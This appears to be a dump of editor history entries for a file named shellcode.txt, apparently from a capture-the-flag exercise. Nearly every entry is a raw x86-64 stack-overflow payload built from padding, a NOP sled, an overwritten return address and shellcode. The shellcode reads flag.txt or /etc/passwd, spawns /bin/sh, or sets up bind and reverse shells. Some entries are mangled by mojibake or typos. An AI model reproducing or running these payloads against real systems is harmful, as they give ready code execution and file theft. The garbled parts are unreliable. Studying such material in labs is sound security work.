	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00H\x8d5√π√ø√ø√øH\x83√Ü\x1a√ºH\x89√∑¬¨\x93¬¨(√ò¬™\x80√´¬¨u√µk\x8b√É√£√•\x05\x199Ap\x12<<\\\x98√ΩQ√â-\x92c√Ü\x03y√ô>√Ñ√¨\x90\x00\x88√©\x9b\x0f\x88√∞g¬§¬±√ò\x12A<\x9e√¢K¬¥"\x93√Ç]√Ä\x87√®_√ì\x92¬π7c\x8c¬¨√¥UE¬∑\x18\x7f¬Æ$%b√øZ√å√≥Ix1\x93√®Q√Ö3Q\x80!\x84√Ç#b√ñ√õ\x02V\x82Cc\x8b¬≤√Å\'y√•l√ç√ßN]\x8b√∞dc√õF¬∫m\x94\x13p\x99√Ö√ó√∑&\x8bT√Ç?¬µ√°Q<yGw\x8b¬¥\x82¬¢^\x88\x076√à√íEe√¢\x02¬º√ú\x8b¬´_\x8eY\x83√ü√ø+\x9b\x9c\x11%\x98√Å)√Ö√•^√Ä\x9b√ÇT\x83¬£\x05√ë:¬µ#√Ö√¥\x90√≥d√ÖC¬∑\x9c√∏\x04|\x11A√Ö√µj\x91¬æ√û√â√≥¬´√öv\x80√Ä√†Gg!A√£\x03\x12\x82√£XK¬æ¬™\x12#C¬§√ï\x83\x8d\x92¬≤\x9e¬æ\x9a¬∫¬°√Å¬´\x0f√£H\x88√´√∂\x16¬±\x13+¬§M√Å\x17|√î√¥¬´\x1b\x17\x8b¬©\x1b√ä√™¬Ω\x18√¥fY√å\x12\x82\x06c\x84\x8e¬™√ä√•\x05\x8d\xad\x08(\x06s√É2V√å\x84¬§A¬≥√ë2w√Ø\x7f¬´0P√º,\x9b\x13.e0d*\x60√ü\x10"X\x84¬∑^\x90√í8<r\x8f√¥\x98√é¬º√µ¬ß√ù√∂(e\x97\x60√Ü[e\x111¬¶√Ü<\\\x8c¬¨√≥c=¬≤\x8b√æ¬æ&√ô√πv√®s√îz√≤√©√≥√è√Ø√ê√∞√î√¥\x97¬∑N¬ª√ä9√åB.N\x0e\x80\x04hd√ç¬ø√´^~√¥f√∑ji√ô¬∑√Å[{Nn√à√®¬∑√ów¬¶Dn\x88¬®¬∏(¬æ3¬µ(√ñ>#C√¥Up√¢\x12yK√Ä¬∫\'\x99√æS√Å√Ωq\x84¬§)\x8a√™\\√≥ec√Ñ\x11\x8a]}¬°√ºEl\x91√Ä¬ø!V¬ø\x04r{¬™U¬∏\x00a\x00t√á#√îL\x0f?V\x869\x60\x9a√Ü¬∞√êHoV¬º√Ñ0p√ëQ¬∏\x7f\xad8¬¨¬∂.c√ó√é*√£[√ï\x05$T#Jw√î\x96¬∂\x1bE¬Ω√¨9CDds\x93\x01!\x04$S\x82/Y5U\x83√≥¬∫/\x84√∑\x89√±√≤\x12√¢D√≤\x19\x98√áC¬•\x98\x01¬Ω+Et\x90√≥¬∏\x19\x8b√ø¬∑\x13\x18\x90\x99√â{¬´√©O√É/\x18ym√î¬∫√®Y√çL√Ñ\x91\x05/\x8bp√®Eu√Ä√∞Mt!A\x9d√á\x7f¬Æ√à√í\x90¬∞√ë√±_\x7f\x86¬¶C¬≥\x9d\x12v√©√ç5(H>n\x8e\x06√ê\x07√∂*MW√ü√ød\x84¬™√ä√ª\x1b_√åt√£\x06|√Ç√¢R√Ñ\'\x88W√è√ó\x03¬©√â6f\x00xa\x92e\x95"SGw\x95√Ü\x055\x023√á√∑\x19J9i√†\x11T\x84√®\x19√¢\x12¬∫√´¬∫√Ñ-M\xad√ç\x82¬¢\x0e.2¬¢¬æ3W√ä√Ç*\'G√óI\x95√∂√à@¬ª√Ö0P\x8d\xad$D√á√ß\x12\x7ft√£s√©√ç√≠\x89√ªF¬ßa√ô\x1bG\x60\x80¬Ω√≠\x1a\x92Ct_\x8f2c√É√≥n\x9f¬ß√ó¬ø√∞\x60\x90√é√ø;kz¬´√π)√ã√º¬ø√Ø√ä√ª√¶\x06*\x88√ß\x07K{z√≤¬π√∞¬≤√™¬©√†#W|¬Æ\x93√∏:p\x95√å√ù\x13¬•√ñ√±\'T¬∑¬¢√ò\x12H3cHx¬®¬≤\x93¬≥\x1228X¬ª√õ&\x9e¬°\x10|√Æ¬Æ√é2\x8d√Ç4;¬Æ√ã;Z¬∑¬©√ï\\|X√ä√∑X*¬¢\x90\x9aq\x91¬§√Ñ\x92¬≤p\x90¬æ+√Å03¬©Zzw√©F¬ß\'\x9f@l¬ß√á\x000¬£\x1b$[M\x81√û\x14√£\x14Dz√ê\x03\x95√á√∏^√à√æ\x86√´n¬§K\x84\x82¬∏¬≤√§√Ø!,\x92√ò√¢Ff;[\x93¬≥(Hg√ó√ñK√ç@%\x8d√π\x19C¬µ¬≥\x14√íJ\x91\x9b√ö√∫0P<\\√î√¥E¬Ω√îCh√öQq7\x9c\x7f√≤√úE¬ø√´\x122H\xad.¬°¬Ω&¬Æ√é\x043,VKk√µ%Cc\x14>$S¬∑√Å√Å√°k\x8b/OHh\x17\x87H¬Ω4¬ßh√êDd¬±#5¬®C¬¨y\x99S\x82Y\x83¬æ√û#\x91√´\x60C¬Øc√èw\x97\x9b\x0f\x01fb√î√®U√£L¬∂$¬±\x12\x8b√ø\x86√´%EHr¬π√®@J\x166&F¬±√ë√ù√Ω¬∑\'-¬¢7¬™-\x95,L6fP√à\x023\x9b√å√ò√¢¬©√â@\x600P\x06&√≥c<¬´¬ß\x17\x02"Q√É¬≥&√ã4\x93\x9d√≥\x13c\x83^~¬¢√Ç\x89√™\x9c\x00o√ì√Ø\x0f\\√éc√ñ(\x91T\x80n\x8eC¬µK¬æ√§T√©√≥√ë√±\x8e¬Æ√ü√ø@\x60¬´\x1b/¬§¬£\x16\x1a\x82XxJ¬º9¬¨¬Ø\x18\x188_\x8e?i√ô√πf\x8d√á-√å89\x9aC¬™;i:¬Æ\x00x]√ë\x84√†¬´#=m6fe\x8cCc\x071¬¶√ï√ò√¢\x9a¬∫\x8c¬¨√°\x01d\x84¬ª+√®]S√Ü√Ä(√à√®h\x986¬Æ"S>n2<\x07\'\x9c¬º\x82¬¢√∫\x1a√ªk@¬ØK¬ª0P√≠_√™]√¥]U_√∑\x17;[√ú√ºi\x89\x8b√¨|√†T¬∏=]√®Z\x03v√ñ?√Å√≠√û√æ}√Ø#\x96l√ú\'1h\x88¬£√É\x05%p\x90\x84√¥\x88√Ω\\√è~√¶√ó√∑\x88√∫√É6E¬Æt\x94{¬™¬∞√ö9Y\x94¬ª\x8f¬æ√Ç$√∂_}√´U\x84p√ì√©J&\x9aF¬¢X√ê+[]\x8d¬±√ò¬§√Ñ#M\x86¬µ*4¬©√â√Ä√†<\\√ä√™:¬ß\x97\x06w√≠√ñ√∂M¬ø√êCF¬ØBn√õ√ª¬∏*√°T$\x94√©√≥{\x9bd\x84√ï√µ¬®√à]√ï\x9f\x0e\x95\x073S√≥Xf√ä¬Æ&+W√Ö√•f√ã.\x92I√Åm\x8dm\x9c√î√æ}\x9d\x98√à√Ö√•\x97√Å√Å√∞\x07\x11v\x96\xad√ç√∞\x10?_O~Dn¬∂√ñ\x87√™E¬¶c√è¬´\x17\x01!$\x89¬ø7√ñ;\x95√∏√á=^√É{¬£√å√µ√¥\x14Z\x84{¬™+5t\x94/O¬•√Ö\x05%√¨\\g√ú<¬Ø4\x9c√¢\x02¬ø\x12√®A8\x8bD¬£W¬º\x02z\x01f]√ÄA¬∑J¬Ø¬µ√ï√ï\x04o\x994T√¢\x12\x12\x8a+^\x8b√≠¬∑√óV\x80a\x90\x95\x9f\x8c¬¨\x100√ì√≥\x82¬¢√Ø_√¢Q\x97\x07¬£√É\x08zx√ô\x07\x7f√∏\x02p\x90√Æ\x0eHh\x02"√òKi√¢l√ü\x80√£√´LR¬æ√á3√¨√∂¬¨¬¥"`
491dd1e373b9ed4d76a7fe05678086cb|file:///home/neo/ccsc/guydebois/shellcode.txt|38|192|v|text
	\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"`
a3bfa97e063c0d291674a9d0dc3aec7f|file:///home/neo/ccsc/guydebois/shellcode.txt|40|1|V|text
	\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05
31303b395bca23f2c6eb5319438a3d99|file:///home/neo/ccsc/guydebois/shellcode.txt|38|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"`
92553a09b17e64a3111077fe123b7a6b|file:///home/neo/ccsc/guydebois/shellcode.txt|38|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x99\x0f\x05\x41\xba\xff\xff\xff\x7f\x48\x89\xc6\x6a\x28\x58\x6a\x01\x5f\x99\x0f\x05"
edde65bc5af037f141afe2b54f6ee0d0|file:///home/neo/ccsc/guydebois/shellcode.txt|9|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x97\xb0\x2a\x48\xb9\xfe\xff\xee\xa3\xf5\xfc\x0d\x8d\x48\xf7\xd9\x51\x54\x5e\xb2\x10\x0f\x05\x6a\x03\x5e\xb0\x21\xff\xce\x0f\x05\x75\xf8\x99\xb0\x3b\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x51\x54\x5f\x0f\x05"
046feaf4207c46dc28097e0aeac34c80|file:///home/neo/ccsc/guydebois/shellcode.txt|19|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x07\xd1\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"`
49034e1b526f5ab4b0d0ba7b8e3768db|file:///home/neo/ccsc/guydebois/shellcode.txt|19|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\x07\xd1\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
171f02864f0e2b0a03b202f4a0836edc|file:///home/neo/ccsc/guydebois/shellcode.txt|19|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x31\xc0\x31\xdb\x31\xd2\xb0\x01\x89\xc6\xfe\xc0\x89\xc7\xb2\x06\xb0\x29\x0f\x05\x93\x48\x31\xc0\x50\x68\x02\x01\xd1\x07\x88\x44\x24\x01\x48\x89\xe6\xb2\x10\x89\xdf\xb0\x31\x0f\x05\xb0\x05\x89\xc6\x89\xdf\xb0\x32\x0f\x05\x31\xd2\x31\xf6\x89\xdf\xb0\x2b\x0f\x05\x89\xc7\x48\x31\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\xfe\xc0\x89\xc6\xb0\x21\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x50\x5f\xb0\x3c\x0f\x05"
0a149dd9096f9afab4d754e57503af1f|file:///home/neo/ccsc/guydebois/shellcode.txt|42|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x68\x2c\x72\x73\x69\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"`
5b15a9d24b3e73614c93d1bf4ad3008a|file:///home/neo/ccsc/guydebois/shellcode.txt|42|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x68\x2c\x72\x73\x69\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"
ba45c11cd00b92d256de8983809003cd|file:///home/neo/ccsc/guydebois/shellcode.txt|44|192|v|text
	\x49\x89\xf8\x68\x2c\x72\x73\x69\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05
a34314bb4c7bc0e3240cadbf85d83fd3|file:///home/neo/ccsc/guydebois/shellcode.txt|44|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"`
6d7b793bfe411a18ca28edd4a841a70b|file:///home/neo/ccsc/guydebois/shellcode.txt|46|1|V|text
	\x49\x89\xf8\x6a\x01\xfe\x0c\x24\x48\xb8\x66\x6c\x61\x67\x2e\x74\x78\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05
e56365fced152992be7b32bbc90c5853|file:///home/neo/ccsc/guydebois/shellcode.txt|47|1|V|text
	\x49\x89\xf8\x68\x79\x75\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05
cc472e014dc86ea3924c605d9c1e6709|file:///home/neo/ccsc/guydebois/shellcode.txt|46|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x68\x79\x75\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"`
c62803730bafd0f39001c671d594bdb3|file:///home/neo/ccsc/guydebois/shellcode.txt|46|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x68\x79\x75\x01\x01\x81\x34\x24\x01\x01\x01\x01\x48\xb8\x2e\x2f\x66\x6c\x61\x67\x2e\x74\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"
20a23235f1180b262af5d68760210ecd|file:///home/neo/ccsc/guydebois/shellcode.txt|50|1|V|text
	\x49\x89\xf8\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x75\x2d\x73\x72\x68\x01\x01\x01\x48\x31\x04\x24\x48\xb8\x2f\x66\x6c\x61\x67\x2e\x74\x78\x50\x48\xb8\x75\x79\x64\x65\x62\x6f\x69\x73\x50\x48\xb8\x6f\x2f\x63\x63\x73\x63\x2f\x67\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x6e\x65\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05
65fe1a78af1783ab9bab4bc303d99671|file:///home/neo/ccsc/guydebois/shellcode.txt|48|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x75\x2d\x73\x72\x68\x01\x01\x01\x48\x31\x04\x24\x48\xb8\x2f\x66\x6c\x61\x67\x2e\x74\x78\x50\x48\xb8\x75\x79\x64\x65\x62\x6f\x69\x73\x50\x48\xb8\x6f\x2f\x63\x63\x73\x63\x2f\x67\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x6e\x65\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"`
59f6ad9005c972c91db7775d48948e6c|file:///home/neo/ccsc/guydebois/shellcode.txt|48|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x75\x2d\x73\x72\x68\x01\x01\x01\x48\x31\x04\x24\x48\xb8\x2f\x66\x6c\x61\x67\x2e\x74\x78\x50\x48\xb8\x75\x79\x64\x65\x62\x6f\x69\x73\x50\x48\xb8\x6f\x2f\x63\x63\x73\x63\x2f\x67\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x6e\x65\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05"
85a72a406971693f973130b2044ee3d4|file:///home/neo/ccsc/guydebois/shellcode.txt|50|8|v|text
	printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
1bf39e5654f3a4d4dbfda4af0d0b7d2a|file:///home/neo/ccsc/guydebois/shellcode.txt|50|1|V|text
	r <<< `pddrintf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"`
cc5557fabc29a6af67e60214f21da147|file:///home/neo/ccsc/guydebois/shellcode.txt|48|1|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00\x49\x89\xf8\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x75\x2d\x73\x72\x68\x01\x01\x01\x48\x31\x04\x24\x48\xb8\x2f\x66\x6c\x61\x67\x2e\x74\x78\x50\x48\xb8\x75\x79\x64\x65\x62\x6f\x69\x73\x50\x48\xb8\x6f\x2f\x63\x63\x73\x63\x2f\x67\x50\x48\xb8\x2f\x68\x6f\x6d\x65\x2f\x6e\x65\x50\x6a\x02\x58\x48\x89\xe7\x31\xf6\x0f\x05\x48\x89\xc3\x48\x89\xc7\x6a\x05\x58\x48\x89\xe6\x0f\x05\x48\x83\xc4\x30\x48\x8b\x14\x24\x49\x89\xd2\x6a\x28\x58\x4c\x89\xc7\x48\x89\xde\x99\x0f\x05\x31\xc0\x40\x89\xc3\xcd\x80"`
d5946f3fde290feafa45fe45098d4b7d|file:///home/neo/ccsc/guydebois/shellcode.txt|48|192|V|text
	r <<< `printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x90\x90\x90\x90\x90\x90\x90\x90\x67\x06\x40\x00\x00\x00\x00\x00"`
	\x6a\x29\x58\x6a\x02\x5f\x6a\x01\x5e\x99\x0f\x05\x52\xba\x01\x01\x01\x01\x81\xf2\x03\x01\x06\xd0\x52\x6a\x10\x5a\x48\x89\xc5\x48\x89\xc7\x6a\x31\x58\x48\x89\xe6\x0f\x05\x6a\x32\x58\x48\x89\xef\x6a\x01\x5e\x0f\x05\x6a\x2b\x58\x48\x89\xef\x31\xf6\x99\x0f\x05\x48\x89\xc5\x6a\x03\x5e\x48\xff\xce\x78\x0b\x56\x6a\x21\x58\x48\x89\xef\x0f\x05\xeb\xef\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05
94b29ff3fdd7a97e27d131450cb7fbda|file:///home/neo/ccsc/guydebois/shellcode.txt|49|1|V|text
